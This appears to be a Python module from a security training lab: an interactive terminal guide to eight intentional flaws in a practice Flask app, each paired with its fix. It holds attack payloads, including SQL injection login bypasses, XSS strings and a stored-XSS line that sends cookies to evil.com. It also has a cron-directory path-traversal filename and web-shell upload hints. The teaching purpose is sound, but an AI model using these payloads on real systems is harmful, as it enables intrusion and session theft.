"""
JJ's LAB -- Vulnerable App Endpoint Guide
===========================================
Interactive guide documenting every intentional vulnerability in the
practice Flask application and its safe (fixed) counterpart.

Run the vulnerable app:  python vulnerable_app/app.py
Then use this guide to know what to attack and how.
"""

import textwrap

from utils.display import (
    section_header, sub_header, info, warning, code_block,
    press_enter, show_menu, C, G, Y, R, DIM, BRIGHT, RESET,
)

# ---------------------------------------------------------------------------
# Vulnerability catalogue  (derived from vulnerable_app/app.py)
# ---------------------------------------------------------------------------

_VULNS = [
    # ------------------------------------------------------------------
    # 1. SQL Injection (Login)
    # ------------------------------------------------------------------
    {
        "title": "SQL Injection -- Login Bypass",
        "endpoint": "/login",
        "method": "POST",
        "vuln_type": "SQL Injection (CWE-89)",
        "description": (
            "The login form builds its SQL query using Python f-string "
            "formatting, inserting the username and password directly "
            "into the query string. This lets an attacker manipulate "
            "the query logic and bypass authentication entirely."
        ),
        "what_to_look_for": (
            "Look at how the SQL query is constructed. The username and "
            "password values are placed into the query with f-string "
            "interpolation instead of parameterized placeholders. Any "
            "single quote in the input breaks out of the string literal "
            "and becomes part of the SQL statement."
        ),
        "example_payloads": [
            "Username: ' OR 1=1 --          (logs in as the first user)",
            "Username: admin' --             (logs in as admin, ignores password)",
            "Username: ' UNION SELECT 1,2,3,4,5,6 --   (data extraction)",
        ],
        "vulnerable_code": (
            "query = f\"SELECT * FROM users\"\n"
            "        f\" WHERE username = '{username}'\"\n"
            "        f\" AND password = '{password}'\""
        ),
        "safe_endpoint": "/safe/login",
        "fix_summary": (
            "Uses parameterized queries (? placeholders) instead of "
            "string formatting, so user input is never interpreted as SQL."
        ),
    },
    # ------------------------------------------------------------------
    # 2. Reflected XSS (Search)
    # ------------------------------------------------------------------
    {
        "title": "Reflected Cross-Site Scripting (XSS) -- Search",
        "endpoint": "/search?q=PAYLOAD",
        "method": "GET",
        "vuln_type": "Reflected XSS (CWE-79)",
        "description": (
            "The search page renders the user's query parameter directly "
            "into the HTML response without escaping. Any HTML or "
            "JavaScript in the query is executed in the victim's browser."
        ),
        "what_to_look_for": (
            "The search query 'q' is passed to the template and rendered "
            "without escaping. The database query itself is parameterized "
            "(safe), but the displayed search term is not sanitized. "
            "The vulnerability is in how the output is rendered, not how "
            "the database is queried."
        ),
        "example_payloads": [
            "/search?q=<script>alert('XSS')</script>",
            "/search?q=<img src=x onerror=alert(document.cookie)>",
            '/search?q=<body onload=alert("Reflected_XSS")>',
        ],
        "vulnerable_code": (
            "# The raw query is passed to the template\n"
            "return render_template(\n"
            '    "search.html", query=query, results=results\n'
            ")"
        ),
        "safe_endpoint": "/safe/search",
        "fix_summary": (
            "Uses markupsafe.escape() on the query before rendering it "
            "into the page, converting special characters to HTML entities."
        ),
    },
    # ------------------------------------------------------------------
    # 3. Stored XSS (Comments)
    # ------------------------------------------------------------------
    {
        "title": "Stored Cross-Site Scripting (XSS) -- Comments",
        "endpoint": "/comment",
        "method": "POST",
        "vuln_type": "Stored XSS (CWE-79)",
        "description": (
            "The comment form stores raw user input in the database and "
            "renders it with Jinja2's |safe filter, so embedded scripts "
            "execute every time any user views the page."
        ),
        "what_to_look_for": (
            "Comment content is stored without sanitization. The template "
            "uses the |safe filter on the content field, telling Jinja2 "
            "not to escape it. Any visitor who loads the page triggers "
            "the injected script. This is more dangerous than reflected "
            "XSS because it persists."
        ),
        "example_payloads": [
            'Comment: <script>alert("Stored XSS")</script>',
            "Comment: <img src=x onerror=alert(document.cookie)>",
            'Comment: <svg onload=fetch("http://evil.com/?c="+document.cookie)>',
        ],
        "vulnerable_code": (
            "# Storing raw user input without sanitization\n"
            "db.execute(\n"
            '    "INSERT INTO comments (author, content) VALUES (?, ?)",\n'
            "    (author, content),\n"
            ")\n"
            "# Template renders with |safe -- XSS fires on every page load"
        ),
        "safe_endpoint": "/safe/comment",
        "fix_summary": (
            "Escapes all comment content with markupsafe.escape() before "
            "rendering, so HTML/JS is displayed as text, not executed."
        ),
    },
    # ------------------------------------------------------------------
    # 4. IDOR (Profile)
    # ------------------------------------------------------------------
    {
        "title": "Insecure Direct Object Reference (IDOR) -- Profile",
        "endpoint": "/profile/<user_id>",
        "method": "GET",
        "vuln_type": "IDOR / Broken Access Control (CWE-639)",
        "description": (
            "Any user (even unauthenticated) can view any other user's "
            "profile -- including email, role, and bio -- simply by "
            "changing the numeric ID in the URL."
        ),
        "what_to_look_for": (
            "The endpoint takes a user ID directly from the URL path and "
            "fetches the corresponding database row. There is no check "
            "to verify that the requesting user is logged in or authorized "
            "to see that profile. You can enumerate all users by iterating "
            "through IDs."
        ),
        "example_payloads": [
            "/profile/1   (view admin's profile)",
            "/profile/2   (view alice's profile)",
            "/profile/3   (view bob's profile)",
            "Enumerate /profile/1 through /profile/5 to dump all users",
        ],
        "vulnerable_code": (
            "# No authorization check -- anyone can access any profile\n"
            "user = db.execute(\n"
            '    "SELECT * FROM users WHERE id = ?", (user_id,)\n'
            ").fetchone()"
        ),
        "safe_endpoint": "/safe/profile/<user_id>",
        "fix_summary": (
            "Requires authentication, then checks that the logged-in "
            "user matches the requested profile ID (or is an admin)."
        ),
    },
    # ------------------------------------------------------------------
    # 5. Unrestricted File Upload
    # ------------------------------------------------------------------
    {
        "title": "Unrestricted File Upload",
        "endpoint": "/upload",
        "method": "POST",
        "vuln_type": "Unrestricted File Upload (CWE-434)",
        "description": (
            "The upload form accepts any file type, has no size limit, "
            "and saves the file using the original (unsanitized) filename. "
            "An attacker could upload a web shell or use path traversal "
            "in the filename."
        ),
        "what_to_look_for": (
            "The uploaded file's original filename is used as-is (no call "
            "to secure_filename()). There is no extension allow-list and "
            "no file size check. The file is written directly to the "
            "uploads/ directory. Path traversal in the filename could "
            "write files outside the intended directory."
        ),
        "example_payloads": [
            "Upload a .py or .php file containing a web shell",
            "Filename: ../../../etc/cron.d/evil  (path traversal)",
            "Upload a 10 GB file (no size limit = denial of service)",
        ],
        "vulnerable_code": (
            "# No file type validation, no size limit, unsanitized name\n"
            "filename = uploaded.filename  # Not using secure_filename!\n"
            "filepath = os.path.join(\n"
            '    app.config["UPLOAD_FOLDER"], filename\n'
            ")\n"
            "uploaded.save(filepath)"
        ),
        "safe_endpoint": "/safe/upload",
        "fix_summary": (
            "Validates the file extension against an allow-list, enforces "
            "a 2 MB size limit, and uses werkzeug.utils.secure_filename() "
            "to sanitize the filename."
        ),
    },
    # ------------------------------------------------------------------
    # 6. Open Redirect
    # ------------------------------------------------------------------
    {
        "title": "Open Redirect",
        "endpoint": "/redirect?url=PAYLOAD",
        "method": "GET",
        "vuln_type": "Open Redirect (CWE-601)",
        "description": (
            "The endpoint redirects the user to whatever URL is provided "
            "in the 'url' query parameter, without any validation. "
            "Attackers use this to build phishing links that appear to "
            "originate from a trusted domain."
        ),
        "what_to_look_for": (
            "The redirect endpoint reads request.args['url'] and passes "
            "it directly to Flask's redirect() function. No check is "
            "performed to ensure the target is on the same host or is "
            "a relative path. An attacker can send a victim a link like "
            "http://trusted-site.com/redirect?url=https://evil.com."
        ),
        "example_payloads": [
            "/redirect?url=https://evil.com",
            "/redirect?url=https://evil.com/fake-login",
            "/redirect?url=//evil.com   (protocol-relative URL)",
        ],
        "vulnerable_code": (
            '# Redirecting to an unvalidated user-supplied URL\n'
            'target = request.args.get("url", "/")\n'
            "return redirect(target)"
        ),
        "safe_endpoint": "/safe/redirect",
        "fix_summary": (
            "Parses the URL and rejects any target that contains a scheme "
            "or netloc (i.e., only relative paths are allowed)."
        ),
    },
    # ------------------------------------------------------------------
    # 7. Broken Access Control (API)
    # ------------------------------------------------------------------
    {
        "title": "Broken Access Control -- User API",
        "endpoint": "/api/users",
        "method": "GET",
        "vuln_type": "Broken Access Control (CWE-284)",
        "description": (
            "The API endpoint returns the full list of users -- including "
            "plaintext passwords and emails -- without requiring any "
            "authentication or authorization."
        ),
        "what_to_look_for": (
            "The endpoint queries all columns (id, username, password, "
            "email, role, bio) from the users table and returns them as "
            "JSON. There is no session check, no API key requirement, "
            "and no field filtering. Anyone can access this data."
        ),
        "example_payloads": [
            "curl http://127.0.0.1:5050/api/users",
            "Open http://127.0.0.1:5050/api/users in any browser",
            "Use Python: requests.get('http://127.0.0.1:5050/api/users').json()",
        ],
        "vulnerable_code": (
            "# No authentication, exposes sensitive fields\n"
            "users = db.execute(\n"
            '    "SELECT id, username, password, email, role, bio "\n'
            '    "FROM users"\n'
            ").fetchall()\n"
            "return jsonify([dict(u) for u in users])"
        ),
        "safe_endpoint": "/safe/api/users",
        "fix_summary": (
            "Requires authentication (session check), and only returns "
            "non-sensitive fields (id, username, bio) -- passwords and "
            "emails are excluded."
        ),
    },
    # ------------------------------------------------------------------
    # 8. Hardcoded Credentials (Admin)
    # ------------------------------------------------------------------
    {
        "title": "Hardcoded Credentials -- Admin Panel",
        "endpoint": "/admin",
        "method": "POST",
        "vuln_type": "Hardcoded Credentials (CWE-798)",
        "description": (
            "The admin login page compares user input against credentials "
            "that are hardcoded directly in the Python source code "
            "(admin / password123). Anyone who reads the source or "
            "guesses common defaults gains full admin access."
        ),
        "what_to_look_for": (
            "Two module-level constants -- ADMIN_USERNAME and "
            "ADMIN_PASSWORD -- store the credentials in plaintext. "
            "The login handler does a simple string comparison against "
            "these constants. No hashing, no environment variables, "
            "no secrets manager."
        ),
        "example_payloads": [
            "Username: admin    Password: password123",
            "Read the source code:  grep ADMIN_PASSWORD app.py",
            "Brute-force common defaults: admin/admin, admin/password, etc.",
        ],
        "vulnerable_code": (
            '# Credentials hardcoded in source code\n'
            'ADMIN_USERNAME = "admin"\n'
            'ADMIN_PASSWORD = "password123"\n'
            "\n"
            "# Simple string comparison -- no hashing\n"
            "if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:"
        ),
        "safe_endpoint": "(no separate safe endpoint -- see lessons on secrets management)",
        "fix_summary": (
            "Store credentials in environment variables or a secrets "
            "manager, hash passwords with bcrypt/argon2, and never "
            "commit secrets to source code."
        ),
    },
]


# ---------------------------------------------------------------------------
# App-wide vulnerability notes
# ---------------------------------------------------------------------------

_APP_WIDE_NOTES = [
    (
        "Weak Secret Key",
        "app.secret_key is set to 'supersecretkey123' -- a short, "
        "guessable string hardcoded in source. An attacker who knows "
        "the secret key can forge session cookies."
    ),
    (
        "Plaintext Password Storage",
        "User passwords are stored as plaintext in the SQLite database "
        "(no hashing). A database leak exposes every credential."
    ),
    (
        "In-Memory Database",
        "The app uses an in-memory SQLite database that resets on every "
        "restart. This is intentional for the lab, but it means state "
        "does not persist between sessions."
    ),
]


# ---------------------------------------------------------------------------
# Seed user data (for reference)
# ---------------------------------------------------------------------------

_SEED_USERS = [
    ("admin",   "password123",  "admin", "admin@seclab.local"),
    ("alice",   "alice2024",    "user",  "alice@seclab.local"),
    ("bob",     "bob_secure!",  "user",  "bob@seclab.local"),
    ("charlie", "charlie789",   "user",  "charlie@seclab.local"),
    ("diana",   "diana_pass",   "user",  "diana@seclab.local"),
]


# ---------------------------------------------------------------------------
# Interactive Guide Menu
# ---------------------------------------------------------------------------

def vuln_app_guide_menu(progress: dict):
    """Interactive guide to the vulnerable app endpoints."""
    while True:
        options = [("all", "View All Vulnerabilities")]
        for i, vuln in enumerate(_VULNS):
            short = vuln["vuln_type"].split("(")[0].strip()
            options.append((f"vuln_{i}", f"{short} -- {vuln['endpoint'].split('?')[0]}"))
        options.append(("notes", "App-Wide Security Notes"))
        options.append(("cheatsheet", "Quick-Reference Cheat Sheet"))
        options.append(("users", "Seed Users & Credentials"))

        choice = show_menu("Vulnerable App Practice Guide", options)

        if choice == "back":
            return
        if choice == "quit":
            raise SystemExit

        if choice == "all":
            _show_all_vulns()
        elif choice == "notes":
            _show_app_notes()
        elif choice == "cheatsheet":
            _show_cheat_sheet()
        elif choice == "users":
            _show_seed_users()
        elif choice.startswith("vuln_"):
            idx = int(choice.replace("vuln_", ""))
            _show_single_vuln(idx)


# ---------------------------------------------------------------------------
# Display: Single Vulnerability
# ---------------------------------------------------------------------------

def _show_single_vuln(index: int):
    """Display detailed information for one vulnerability."""
    vuln = _VULNS[index]

    section_header(f"Vulnerability {index + 1}: {vuln['title']}")

    print(f"  {C}{BRIGHT}Endpoint:{RESET}   {vuln['endpoint']}")
    print(f"  {C}{BRIGHT}Method:{RESET}     {vuln['method']}")
    print(f"  {C}{BRIGHT}Type:{RESET}       {vuln['vuln_type']}")
    print()

    # Description
    print(f"  {BRIGHT}What is wrong:{RESET}")
    for line in _wrap(vuln["description"]):
        print(f"    {line}")
    print()

    # What to look for
    print(f"  {BRIGHT}What to look for:{RESET}")
    for line in _wrap(vuln["what_to_look_for"]):
        print(f"    {line}")
    print()

    # Vulnerable code snippet
    code_block(vuln["vulnerable_code"], language="python (vulnerable)")

    # Example payloads
    print(f"  {Y}{BRIGHT}Example test payloads:{RESET}")
    for payload in vuln["example_payloads"]:
        print(f"    {R}>{RESET} {payload}")
    print()

    # Safe version
    print(f"  {G}{BRIGHT}Safe version:{RESET}  {vuln['safe_endpoint']}")
    print(f"  {G}{BRIGHT}Fix:{RESET}           {vuln['fix_summary']}")
    print()

    press_enter()


# ---------------------------------------------------------------------------
# Display: All Vulnerabilities
# ---------------------------------------------------------------------------

def _show_all_vulns():
    """Display all vulnerabilities sequentially."""
    section_header("Vulnerable App Guide -- All Endpoints")
    info("The practice Flask app runs at http://127.0.0.1:5050")
    info("Start it from the main menu or run: python vulnerable_app/app.py")
    print()
    warning("This app is INTENTIONALLY insecure. Run it on localhost only.")
    press_enter()

    for i in range(len(_VULNS)):
        _show_single_vuln(i)


# ---------------------------------------------------------------------------
# Display: App-Wide Notes
# ---------------------------------------------------------------------------

def _show_app_notes():
    """Display app-wide security notes."""
    section_header("App-Wide Security Notes")
    info("These issues affect the entire application, not just one endpoint.\n")

    for title, note in _APP_WIDE_NOTES:
        print(f"  {Y}{BRIGHT}{title}{RESET}")
        for line in _wrap(note):
            print(f"    {line}")
        print()

    press_enter()


# ---------------------------------------------------------------------------
# Display: Cheat Sheet
# ---------------------------------------------------------------------------

def _show_cheat_sheet():
    """Display a quick-reference cheat sheet of all endpoints."""
    section_header("Quick-Reference Cheat Sheet")

    info("Base URL: http://127.0.0.1:5050\n")

    print(f"  {C}{BRIGHT}{'#':<4} {'Vuln Type':<30} {'Vuln Endpoint':<22} {'Safe Endpoint'}{RESET}")
    print(f"  {DIM}{'-' * 78}{RESET}")

    for i, vuln in enumerate(_VULNS, 1):
        short_type = vuln["vuln_type"].split("(")[0].strip()
        ep = vuln["endpoint"].split("?")[0]
        safe = vuln["safe_endpoint"].split("(")[0].strip()
        print(f"  {i:<4} {short_type:<30} {ep:<22} {safe}")

    print()
    press_enter()


# ---------------------------------------------------------------------------
# Display: Seed Users
# ---------------------------------------------------------------------------

def _show_seed_users():
    """Display the pre-loaded user credentials."""
    section_header("Seed Users (pre-loaded in the database)")

    info("These users are created fresh each time the app starts.\n")

    print(f"  {C}{BRIGHT}{'Username':<12} {'Password':<16} {'Role':<8} {'Email'}{RESET}")
    print(f"  {DIM}{'-' * 60}{RESET}")

    for uname, pw, role, email in _SEED_USERS:
        print(f"  {uname:<12} {pw:<16} {role:<8} {email}")

    print()
    warning("These are intentionally weak passwords for practice purposes.")
    print()
    press_enter()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _wrap(text: str, width: int = 72) -> list[str]:
    """Wrap text to the given width, returning a list of lines."""
    return textwrap.fill(text, width=width).split("\n")


# ---------------------------------------------------------------------------
# Main (for standalone testing)
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    vuln_app_guide_menu({})
